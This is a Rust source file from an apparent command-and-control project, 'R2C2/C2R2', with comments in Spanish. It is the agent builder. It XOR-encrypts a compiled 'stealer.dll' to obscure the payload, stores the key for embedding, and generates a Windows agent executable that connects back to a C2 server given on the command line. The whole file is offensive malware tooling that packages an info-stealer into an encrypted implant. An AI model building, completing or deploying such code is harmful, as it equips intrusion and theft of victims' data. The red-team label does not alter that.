//! R2C2 es un proyecto de Command & Control para red team engagements en Linux y Windows.

mod encrypt;
mod dll_encrypt;

use clap::Parser;
use encrypt::generate_agent;
use dll_encrypt::{encrypt_dll, generate_random_key};
use std::path::Path;

#[derive(Parser)]
#[command(name = "c2r2-builder")]
#[command(about = "C2R2 Agent Builder - Genera agentes para conexión directa", long_about = None)]
struct Args {
    /// Nombre del agente generado (sin extensión .exe)
    #[arg(short, long)]
    name: String,
    
    /// Servidor C2 (IP:Puerto)
    #[arg(short, long, default_value = "127.0.0.1:4444")]
    server: String,
}

fn main() {
    let args = Args::parse();

    println!("🔧 C2R2 Agent Builder v2.0 - Direct Connection + Encrypted Payload");
    println!("🏷️  Agente: {}", args.name);
    println!("🌐 Servidor C2: {}", args.server);
    println!("{}", "-".repeat(50));

    // Paso 1: Encriptar la DLL de stealer
    println!("\n📦 Paso 1: Encriptando DLL de stealer...");
    let dll_path = Path::new("../target/release/stealer.dll");
    let encrypted_dll_path = Path::new("../agent/encrypted_stealer.bin");
    
    if !dll_path.exists() {
        eprintln!("❌ Error: No se encontró stealer.dll");
        eprintln!("   Ejecuta primero: cargo build --release --package stealer-dll");
        std::process::exit(1);
    }
    
    // Generar clave XOR aleatoria de 32 bytes
    let xor_key = generate_random_key(32);
    
    match encrypt_dll(dll_path, encrypted_dll_path, &xor_key) {
        Ok(_) => println!("✅ DLL encriptada exitosamente"),
        Err(e) => {
            eprintln!("❌ Error encriptando DLL: {}", e);
            std::process::exit(1);
        }
    }
    
    // Guardar la clave en un archivo (será embebida en el código)
    let key_path = Path::new("../agent/dll_key.bin");
    if let Err(e) = std::fs::write(key_path, &xor_key) {
        eprintln!("❌ Error guardando clave: {}", e);
        std::process::exit(1);
    }
    println!("🔑 Clave XOR generada: {} bytes", xor_key.len());

    // Paso 2: Generar el agente
    println!("\n🔨 Paso 2: Generando agente...");
    match generate_agent(&args.name, &args.server) {
        Ok(_) => {
            println!("✅ Agente generado exitosamente");
            println!("\n📋 Archivos generados:");
            println!("   - agent/encrypted_stealer.bin (DLL encriptada)");
            println!("   - agent/dll_key.bin (clave XOR)");
            println!("   - {}.exe (agente final)", args.name);
        }
        Err(e) => {
            eprintln!("❌ Error: {}", e);
            std::process::exit(1);
        }
    }
}
